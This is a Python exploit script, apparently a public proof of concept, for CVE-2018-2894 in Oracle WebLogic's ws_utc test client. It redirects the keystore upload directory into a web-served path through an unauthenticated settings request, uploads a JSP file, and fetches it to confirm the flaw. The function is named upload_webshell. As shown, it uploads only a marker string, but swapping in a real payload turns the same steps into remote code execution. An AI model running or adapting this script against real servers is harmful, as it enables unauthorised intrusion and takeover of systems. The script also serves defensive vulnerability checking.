#!/usr/bin/env python
# coding:utf-8
# Build By LandGrey

from __future__ import print_function
from builtins import str
import re
import sys
import time
import argparse
import requests
import traceback
import xml.etree.ElementTree as ET


def get_current_work_path(host):
    geturl = host + "/ws_utc/resources/setting/options/general"
    ua = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0'}
    values = []
    try:
        request = requests.get(geturl)
        if request.status_code == 404:
            exit("[-] {}  don't exists CVE-2018-2894".format(host))
        elif "Deploying Application".lower() in request.text.lower():
            print("[*] First Deploying Website Please wait a moment ...")
            time.sleep(20)
            request = requests.get(geturl, headers=ua)
        if "</defaultValue>" in request.content:
            root = ET.fromstring(request.content)
            value = root.find("section").find("options")
            for e in value:
                for sub in e:
                    if e.tag == "parameter" and sub.tag == "defaultValue":
                        values.append(sub.text)
    except requests.ConnectionError:
        exit("[-] Cannot connect url: {}".format(geturl))
    if values:
        return values[0]
    else:
        print("[-] Cannot get current work path\n")
        exit(request.content)


def get_new_work_path(host):
    origin_work_path = get_current_work_path(host)
    works = "/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css"
    if "user_projects" in origin_work_path:
        if "\\" in origin_work_path:
            works = works.replace("/", "\\")
            current_work_home = origin_work_path[:origin_work_path.find("user_projects")] + "user_projects\\domains"
            dir_len = len(current_work_home.split("\\"))
            domain_name = origin_work_path.split("\\")[dir_len]
            current_work_home += "\\" + domain_name + works
        else:
            current_work_home = origin_work_path[:origin_work_path.find("user_projects")] + "user_projects/domains"
            dir_len = len(current_work_home.split("/"))
            domain_name = origin_work_path.split("/")[dir_len]
            current_work_home += "/" + domain_name + works
    else:
        current_work_home = origin_work_path
        print("[*] cannot handle current work home dir: {}".format(origin_work_path))
    return current_work_home


def set_new_upload_path(host, path):
    data = {
        "setting_id": "general",
        "BasicConfigOptions.workDir": path,
        "BasicConfigOptions.proxyHost": "",
        "BasicConfigOptions.proxyPort": "80"}
    request = requests.post(host + "/ws_utc/resources/setting/options", data=data, headers=headers)
    if "successfully" in request.content:
        return True
    else:
        print("[-] Change New Upload Path failed")
        exit(request.content)


def upload_webshell(host, uri):
    set_new_upload_path(host, get_new_work_path(host))
    files = {
        "ks_edit_mode": "false",
        "ks_password_front": password,
        "ks_password_changed": "true",
        "ks_filename": ("360sglab.jsp", upload_content)
    }

    request = requests.post(host + uri, files=files)
    response = request.text
    match = re.findall("<id>(.*?)</id>", response)
    if match:
        tid = match[-1]
        shell_path = host + "/ws_utc/css/config/keystore/" + str(tid) + "_360sglab.jsp"
        if upload_content in requests.get(shell_path, headers=headers).content:
            print("[+] {} exists CVE-2018-2894".format(host))
            print("[+] Check URL: {} ".format(shell_path))
        else:
            print("[-] {}  don't exists CVE-2018-2894".format(host))
    else:
        print("[-] {}  don't exists CVE-2018-2894".format(host))


if __name__ == "__main__":
    start = time.time()
    password = "360sglab"
    url = "/ws_utc/resources/setting/keystore"
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", dest='target', default="http://127.0.0.1:7001", type=str,
                        help="target, such as: http://example.com:7001")

    upload_content = "360sglab test"
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest', }

    if len(sys.argv) == 1:
        sys.argv.append('-h')
    args = parser.parse_args()
    target = args.target

    target = target.rstrip('/')
    if "://" not in target:
        target = "http://" + target
    try:
        upload_webshell(target, url)
    except Exception as e:
        print("[-] Error: \n")
        traceback.print_exc()
